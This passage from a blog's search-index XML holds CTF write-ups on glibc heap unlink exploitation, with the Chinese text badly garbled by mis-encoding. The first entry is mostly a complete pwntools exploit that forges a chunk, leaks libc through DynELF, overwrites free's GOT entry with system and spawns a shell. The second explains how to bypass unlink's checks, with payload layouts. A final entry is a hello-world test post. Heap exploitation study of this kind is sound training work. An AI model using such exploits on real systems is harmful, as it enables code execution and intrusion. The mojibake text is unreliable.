ä¸ºfreeè¢«è¦†ç›–ä¸ºsystemï¼Œæ‰€ä»¥å®žé™…è°ƒç”¨system(chunk2)ï¼ŒæˆåŠŸgetshellæˆ‘çš„exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#åœ¨ç¬¬ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸæž„é€ ä¸€ä¸ªå‡chunkï¼Œsizeä¸º0x80ï¼Œå¹¶è®¾ç½®fdã€bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#ä»Žç¬¬ä¸€ä¸ªchunkå†™å…¥æ•°æ®è¦†ç›–åˆ°ç¬¬äºŒä¸ªchunkï¼Œè®²ç¬¬äºŒä¸ªchunkçš„prev_sizeè®¾ä¸º0x80ï¼Œå¹¶å°†sizeçš„in_useæ ‡å¿—ç½®0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#freeç¬¬äºŒä¸ªchunkï¼Œå°†ä¼šè§¦å‘unlinkdelete_chunk(1)#æ³„éœ²systemçš„åœ°å€d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#å°†free_gotçš„åœ°å€è¦†ç›–æŽ‰ç¬¬äºŒä¸ªchunkçš„åœ°å€payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#ä¿®æ”¹ç¬¬äºŒä¸ªchunkï¼Œç”±äºŽåœ°å€è¢«è¦†ç›–ï¼Œå®žé™…ä¿®æ”¹çš„æ˜¯freeçš„gotè¡¨ï¼Œå°†å…¶ä¿®æ”¹ä¸ºsystemçš„åœ°å€set_chunk(1, p32(system))#è°ƒç”¨freeï¼Œå®žé™…è°ƒç”¨systemdelete_chunk(2)p.interactive()æ³¨æ„set_chunkå‡½æ•°ä¸­æœ€åŽåº”è¯¥ç”¨sendè€Œéžsendlineï¼Œå¦åˆ™åœ¨å‘é€çš„æ•°æ®æœ«å°¾ä¼šå¤šå‡ºä¸€ä¸ªâ€™\nâ€™ï¼Œè€Œå¯¼è‡´æ¯”é¢„æœŸå¤šè¦†ç›–ä¸€ä¸ªå­—èŠ‚ï¼Œåœ¨leakæ—¶ä¼šä½¿chunk2çš„æŒ‡é’ˆçš„ä¸€ä¸ªå­—èŠ‚è¢«ä¿®æ”¹ï¼Œæœ€åŽfreeæ—¶å¯¼è‡´æ— æ³•getshellã€‚è‹¥ä½¿ç”¨sendlineï¼Œè¯·åœ¨chunk1åŽå†å¤šåŠ ä¸€ä¸ªchunkæ¥éš”å¼€å­˜æ”¾â€™/bin/sh\x00â€™çš„chunkã€‚unlinkå­¦ä¹ è¿‡ç¨‹ä¸­åº”è¯¥ç€é‡å¼„æ¸…æ¥šä»€ä¹ˆæ—¶å€™æ˜¯åœ°å€ã€ä»€ä¹ˆæ—¶å€™æ˜¯å€¼æ­¤é¢˜ä¸º32ä½ç¨‹åºï¼Œè‹¥æ˜¯64ä½åº”å°†p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)æ”¹ä¸ºp32(chunk_ptr-0x18) + p32(chunk_ptr-0x10)ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šheapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>å †åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å †åˆ©ç”¨å­¦ä¹ ä¹‹unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[åŽŸç†unlinkæ˜¯å†…å­˜æ“ä½œä¸­çš„ä¸€ä¸ªå®ï¼Œ ç”¨æ¥ä»ŽåŒå‘é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ªfree chunkï¼Œå…¶è¿‡ç¨‹ä¸­çš„æŒ‡é’ˆæ“ä½œå­˜åœ¨ä»»æ„å†™çš„æ¼æ´žã€‚ä»ŽåŒå‘é“¾è¡¨ä¸­å–å‡ºèŠ‚ç‚¹çš„è¿‡ç¨‹ï¼Œè‹¥æ˜¯å­¦è¿‡æ•°æ®ç»“æž„åº”è¯¥éƒ½æ¯”è¾ƒæ¸…æ¥šï¼Œä¸»è¦ä»£ç æ˜¯ï¼š12P-&gt;fd-&gt;bk = P-&gt;bkP-&gt;bk-&gt;fd = P-&gt;fdä½†æ˜¯åœ¨unlinkå®ä¸­ï¼Œä¸ºäº†å®‰å…¨æ€§è¿˜å¢žåŠ äº†ä¸€äº›æ£€æŸ¥ï¼šunlinkæºç ï¼š1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125;è¦åˆ©ç”¨è¯¥æ¼æ´žï¼Œå…ˆè¦ç»•è¿‡è¿™é‡Œçš„ä¸¤å¤„æ£€æŸ¥ï¼ˆ64ä½ä¸ºä¾‹ï¼‰ç¬¬ä¸€å¤„æ£€æŸ¥chunksize(P) != prev_size (next_chunk(P))ï¼Œæ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„prevsizeæ˜¯å¦ç­‰äºŽå½“å‰chunkçš„sizeï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡æº¢å‡ºç­‰æ‰‹æ®µè®¾ç½®ä¸‹ä¸€chunkçš„prevsizeç¬¬äºŒå¤„æ£€æŸ¥__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)ï¼Œæ£€æŸ¥å½“å‰chunkæ˜¯å¦æ˜¯å‰ä¸€ä¸ªchunkçš„åŽç»§ï¼ŒåŒæ—¶ä¹Ÿæ˜¯åŽä¸€ä¸ªchunkçš„å‰é©±ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥é“¾è¡¨æ˜¯å¦çœŸçš„æ˜¯é“¾æŽ¥å¥½çš„ã€‚ä½†æ˜¯è¿™ä¸ªæ£€æŸ¥æœ‰ä¸ªè‡´å‘½çš„ç¼ºç‚¹:å› ä¸ºFD-&gt;bk == *(FD+0x18)ã€BK-&gt;fd == *(BK+0x10)è‹¥åœ¨FDä¸­å­˜å…¥&amp;P-0x18ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼å°†å˜ä¸ºFD-&gt;bk == *((&amp;P-0x18)+0x18) == *&amp;P == Pè‹¥åœ¨BKä¸­å­˜å…¥&amp;P-0x10ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼å°†å˜ä¸ºBK-&gt;fd == *((&amp;P-0x10)+0x10) == *&amp;P == Pä»Žè€Œå°±ç»•è¿‡äº†æ£€æŸ¥æ³¨æ„ï¼š&amp;Pæ˜¯è¡¨ç¤ºæŒ‡å‘ç›®æ ‡chunkçš„æŒ‡é’ˆçš„åœ°å€ç»•è¿‡æ£€æŸ¥åŽï¼Œæ»¡è¶³FD-&gt;bk == P &amp;&amp; BK-&gt;fd == Pï¼Œæ‰€ä»¥æœ‰ï¼š12FD-&gt;bk = BK; // P = &amp;P-0x10BK-&gt;fd = FD; // P = &amp;P-0x18åœ¨æ­¤ä¹‹åŽï¼ŒPå°±æŒ‡å‘äº†æ¯”è‡ªå·±çš„åœ°å€ä½Ž0x18ä¸ªå­—èŠ‚çš„ä½ç½®ï¼Œå¯ä»¥é€šè¿‡å†æ¬¡å‘På†™å…¥ä»Žè€Œè¦†ç›–æŽ‰Pæœ¬èº«ï¼Œå°†å…¶ä¿®æ”¹ä¸ºä»»æ„åœ°å€ï¼Œç¬¬ä¸‰æ¬¡å‘På†™å…¥åˆ™å®žçŽ°äº†ä»»æ„åœ°å€å†™ã€‚è§¦å‘å‰æå †æŒ‡é’ˆæ˜¯å…¨å±€å˜é‡ï¼Œæˆ–å…¶åœ°å€æ˜¯å¯æ³„éœ²çš„èƒ½å¤Ÿfreeä¸€ä¸ªsmallchunkæˆ–largechunk(å¯ä»¥æ˜¯ä¼ªé€ çš„)èƒ½å¤ŸæŽ§åˆ¶ä¸‹ä¸€chunkçš„prevsizeå’Œsizeåˆ©ç”¨è¿‡ç¨‹ï¼ˆ64ä½ä¸ºä¾‹ï¼‰æ³•ä¸€å­˜åœ¨å †æº¢å‡ºæ—¶ï¼šåˆ†é…è¿žç»­3ä¸ªchunk a, b, cåœ¨aä¸­ä¼ªé€ chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + paddingè¦†ç›–bçš„prevsizeå’Œsizeï¼Œä¿®æ”¹inuseä½ï¼Œä½¿ä¹‹å¯ä»¥ä¸Žaåˆå¹¶p64(0x80) + p64(0x90)freeæŽ‰bï¼Œè§¦å‘unlinkå†™å…¥aï¼Œè¦†ç›–æŒ‡é’ˆä¸ºä»»æ„åœ°å€ï¼Œp64(0)*3 + p64(addr)å†æ¬¡å†™å…¥aï¼Œä»»æ„åœ°å€å†™å…¥æ³•äºŒä¸èƒ½æº¢å‡ºï¼Œä½†æœ‰double freeåˆ†é…è¿žç»­3ä¸ªfastchunk a, b, cé‡Šæ”¾aï¼Œæ­¤æ—¶å¹¶ä¸ä¼šä¿®æ”¹åŽé¢çš„inuseä½å’Œprevsizeç”³è¯·ä¸€ä¸ªå¤§å†…å­˜ï¼Œè§¦å‘fastbinåˆå¹¶ï¼Œè¿™æ—¶ä¼šå°†fastbinä¸­çš„aå–å‡ºæ”¾å…¥unsortedbinï¼Œå¯ä»¥å®žçŽ°å¯¹bçš„inuseä½è¿›è¡Œä¿®æ”¹è§¦å‘double freeï¼Œå°†aå†æ¬¡é‡Šæ”¾ï¼Œæ”¾å…¥fastbinå†ç”³è¯·ä¸Žaç›¸åŒå¤§å°çš„chunkï¼Œå°±ä¼šä»Žfastbinä¸­å°†aè¿”å›žï¼ŒåŒæ—¶ä¸ä¼šæ”¹å˜bçš„inuseå¸ƒç½®aå†…å­˜ï¼Œé‡Šæ”¾bï¼Œè§¦å‘unlinké¢˜ç›®ä¸€é“å…¸åž‹çš„unlinkä¾‹é¢˜HITCON CTF 2014-stkofHITCON CTF 2016-SleepyHolder]]></content>
      <categories>
        <category>å †åˆ©ç”¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>å †åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
